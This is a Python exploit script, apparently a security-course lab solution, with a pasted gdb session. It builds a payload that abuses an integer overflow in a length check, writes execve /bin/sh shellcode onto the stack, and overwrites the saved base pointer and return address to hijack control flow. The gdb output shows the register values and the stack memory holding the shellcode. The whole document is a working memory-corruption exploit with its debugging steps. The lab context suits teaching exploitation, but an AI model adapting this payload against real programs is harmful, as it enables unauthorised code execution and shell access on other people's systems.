#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#
# Integer Overflow, with enough room in the buffer for the shellcode:
#
# Find a value x such that (x * 4) mod (2^32) = 24.
#
# This is equivalent to finding x such that x = 24 / 4 + k * 2^32 / 4 for some integer k.
# 
# Solving for x gives x = 6 + k * 2^30.
#
# So, any value of x of the form 6 + k * 2^30 will cause (x * 4) mod (2^32) to be 24.
# 
# For example, if k = 1, then x = 6 + 2^30 = 1073741826, and (1073741826 * 4) mod (2^32) is 24.
# 
# So, x = 1073741826 is a solution to the equation (x * 4) mod (2^32) = 24.
# 
# The decimal number 1073741826 is equivalent to the hexadecimal number 0x40000006.
sys.stdout.buffer.write(pack("<I", 0x40000006))

# The shell code is 23 bytes long, but need 24 bytes to fill the buffer
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write("\x01".encode())

# Buffer overflow past other stack variables
sys.stdout.buffer.write(("\x01" * 28).encode())

# Base address
sys.stdout.buffer.write(pack("<I", 0xfffe9650))

# Return Address
sys.stdout.buffer.write(pack("<I", 0xfffe9610))

"""
# 1. 
gdb --args ./1.2.5 tmp
(gdb) b read_file
(gdb) r

# 2. Get the return address
(gdb) info reg
eax            0xffffd419       -11239
ecx            0x4      4
edx            0x3      3
ebx            0x80d9000        135106560
esp            0xfffe9638       0xfffe9638
ebp            0xfffe9644       0xfffe9644
esi            0x80d9000        135106560
edi            0x80481a8        134513064
eip            0x80488ef        0x80488ef <read_file+6>
eflags         0x292    [ AF SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) x/2wx $ebp
0xfffe9644:     0xfffe9650      0x080489b8
(gdb) b *0x080489b8

# 3. Find where the shellcode was written in the stack, it can't be too far above the base pointer
(gdb) x/64bx 0xfffe9610
0xfffe9610:     0x6a    0x0b    0x58    0x99    0x52    0x68    0x2f    0x2f
0xfffe9618:     0x73    0x68    0x68    0x2f    0x62    0x69    0x6e    0x89
0xfffe9620:     0xe3    0x52    0x53    0x89    0xe1    0xcd    0x80    0x01
0xfffe9628:     0x38    0x96    0xfe    0xff    0x04    0x00    0x00    0x00
0xfffe9630:     0x01    0x00    0x00    0x00    0xf0    0xd2    0x0d    0x08
0xfffe9638:     0x06    0x00    0x00    0x40    0x10    0x96    0xfe    0xff
0xfffe9640:     0xf0    0xd2    0x0d    0x08    0x50    0x96    0xfe    0xff
0xfffe9648:     0xb8    0x89    0x04    0x08    0x19    0xd4    0xff    0xff
"""